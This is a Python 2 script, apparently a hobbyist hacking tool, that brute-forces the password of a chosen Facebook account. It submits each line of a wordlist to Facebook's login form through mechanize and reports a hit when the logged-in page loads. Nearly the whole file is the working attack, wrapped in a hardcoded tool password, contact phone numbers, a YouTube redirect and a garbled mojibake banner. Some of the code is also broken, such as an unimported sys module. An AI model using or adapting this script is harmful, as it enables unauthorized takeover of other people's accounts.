#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
        #############################################
        #                                           #
        #    Facebook BruteForce, by Rk Nahid        #
        #    Youtube:    99 GAMER    #
        #   Whtsapp Num +8801892752688                                  #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)


time.sleep(0.5)
user = raw_input('[馃拃] Target Username/ID/Email >>?? ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[馃拃] Wordlist Type nahid.txt >> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
#Dev:Rk_Nahid
##### LOGO #####
logo = """
       \033[1;97m:鈻掆枓鈻掆枓鈻堚枅鈻堚枓鈻堚枅鈻堚枓鈻堚枅鈻堚枓鈻堚枅鈻堚枓鈻掆枓鈻掆枓鈻掆枓鈻掆枓鈻�:
      \033[1;93m鈻掆枓鈻掆枓鈻掆枓鈻掆枓鈻堚枓鈻堚枓鈻堚枓鈻掆枓鈻堚枓鈻堚枓鈻堚枓鈻掆枓鈻掆枓鈻掆枓鈻掆枓鈻�::     
     \033[1;95m:鈻掆枓鈻掆枓鈻掆枓鈻堚枅鈻堚枓鈻堚枓鈻堚枓鈻堚枅鈻堚枓鈻堚枓鈻堚枓鈻掆枓鈻掆枓鈻掆枓鈻掆枓鈻�:::      
    \033[1;94m::鈻掆枓鈻掆枓鈻掆枓鈻堚枓鈻掆枓鈻堚枓鈻堚枓鈻堚枓鈻掆枓鈻堚枓鈻堚枓鈻掆枓鈻掆枓鈻掆枓鈻掆枓鈻�::::      
   \033[1;96m:::鈻掆枓鈻掆枓鈻掆枓鈻堚枅鈻堚枓鈻堚枅鈻堚枓鈻堚枅鈻堚枓鈻堚枅鈻堚枓鈻掆枓鈻掆枓鈻掆枓鈻掆枓鈻�:::::         
  \033[1;96m::鈾р櫑鈾р櫑鈾р櫑鈾р櫑鈾р櫑\033[1;91mWhatsapp\033[1;96m鈾р櫑鈾р櫑鈾р櫑鈾р櫑鈾р櫑鈻掆枓鈻掆枓鈻掆枓鈻�::::        
  \033[1;91m:銆嬨�嬨�媆033[1;93m+923062045786\033[1;91m銆娿�娿�娾枓鈻掆枓鈻掆枓鈻掆枓鈻掆枓鈻掆枓:::::
\033[1;95m鈾♀暛鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈥⑩棃鈥⑩攢鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈺櫋\033[1;96m-KashiGangster-\033[1;95m鈾♀暛鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈥⑩棃鈥⑩攢鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈺櫋
\033[1;92m..............................KashiGangster......................
\033[1;97m鈺斺晽 鈺斺晽鈺斺晲鈺︹暒鈺︹晲鈺� 鈺斺晽鈺斺暒鈺愨暒鈺︹晽
\033[1;97m鈺戔晳 鈺戔暁鈺ｂ晳鈺戔晳鈺戔暕鈺� 鈺氣晽鈺斺暎鈺戔晳鈺戔晳   Arain Brand
\033[1;97m鈺氣暆 鈺氣晲鈺┾晲鈺┾晲鈺┾晲鈺濃晲 鈺氣暆鈺氣晲鈺┾晲鈺� 
\033[1;93m鈾♀暟鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈥⑩棃鈥⑩攢鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈺櫋\033[1;96mKashiGangster\033[1;95m鈾♀暟鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈥⑩棃鈥⑩攢鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈹�鈺櫋"""
print " \x1b[1;93m=Whtsapp Num +923062045786="
CorrectUsername = "Rk Nahid"
CorrectPassword = "RkNahid"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
def login():
	os.system('clear')
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password Found > '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Wrong Password! > "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'Sorry, none of the passswords in your wordlist is right.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
